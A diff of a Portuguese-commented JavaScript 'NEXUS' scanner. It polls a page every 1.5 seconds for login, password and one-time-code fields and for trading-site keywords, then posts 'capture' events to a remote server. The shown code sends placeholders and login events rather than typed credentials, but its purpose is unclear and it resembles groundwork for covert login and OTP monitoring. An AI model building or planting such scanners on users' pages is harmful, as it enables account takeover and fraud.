@@ -13,7 +13,9 @@
                 "X-Nexus-Token": TOKEN
             },
             body: JSON.stringify(data)
-        }).then(r => r.json()).catch(err => {
+        })
+        .then(r => r.json())
+        .catch(err => {
             console.log("Erro ao enviar captura:", err);
         });
     }
@@ -38,7 +40,6 @@
         return { user, pass };
     }
 
-
     function getOTPField() {
         const inputs = document.querySelectorAll("input");
 
@@ -54,7 +55,6 @@
         return null;
     }
 
-
     function checkForLogin() {
         try {
             const { user, pass } = getLoginFields();
@@ -62,20 +62,17 @@
             if (user && pass) {
                 console.log("NEXUS: Campos de login detectados!");
 
-                const capture = {
+                sendCapture({
                     event: "login_fields_detected",
                     user_placeholder: user.placeholder,
                     pass_placeholder: pass.placeholder,
                     timestamp: Date.now()
-                };
-
-                sendCapture(capture);
+                });
             }
         } catch (e) {
             console.log("Erro no scanner login:", e);
         }
     }
-
 
     function checkForOTP() {
         try {
@@ -95,7 +92,6 @@
         }
     }
 
-
     function checkIfLoggedIn() {
         try {
             const keywordTests = [
@@ -103,4 +99,31 @@
                 "Mercado", "OTC", "Ações", "Cripto", "Paridades", "Operar"
             ];
 
-            const found = keywordTests.some(kw
+            const pageText = document.body.innerText || "";
+            const found = keywordTests.some(kw => pageText.includes(kw));
+
+            if (found) {
+                console.log("NEXUS: Login detectado ✔");
+
+                sendCapture({
+                    event: "login_confirmed",
+                    timestamp: Date.now()
+                });
+            }
+        } catch (e) {
+            console.log("Erro no scanner login-detect:", e);
+        }
+    }
+
+    function periodicCheck() {
+        checkForLogin();
+        checkForOTP();
+        checkIfLoggedIn();
+    }
+
+    console.log("NEXUS: scanner ativo. Monitorando…");
+
+    // Roda a cada 1,5s
+    setInterval(periodicCheck, 1500);
+
+})();
